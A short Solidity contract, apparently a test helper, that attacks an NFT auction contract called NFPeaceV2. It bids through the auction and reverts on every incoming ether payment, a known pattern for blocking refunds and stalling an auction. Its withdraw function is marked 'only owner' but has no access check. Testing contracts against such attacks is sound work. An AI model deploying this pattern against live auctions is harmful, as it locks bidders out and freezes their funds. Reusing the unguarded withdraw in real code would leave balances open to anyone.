// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "./NFPeaceV2.sol";

contract NFPeaceAttacker {
    NFPeaceV2 private nfPeace;
    bool private revertReceive = true;

    constructor (address nfpeaceAddress)
    {
        nfPeace = NFPeaceV2(nfpeaceAddress);
    }

    receive () external payable {
        if (revertReceive) {
            revert("Caught the NFT...");
        }
    }

    /// @dev Enter a new bid
    /// @param auctionId The Auction ID to bid on
    function bid (uint64 auctionId) external payable {
        nfPeace.bid{value: msg.value}(auctionId);
    }

    /// @dev Withdraw refunded balance
    function withdraw () external payable {
        // only owner
        revertReceive = false;
        nfPeace.withdraw();
        revertReceive = true;
        payable(msg.sender).transfer(address(this).balance);
    }
}
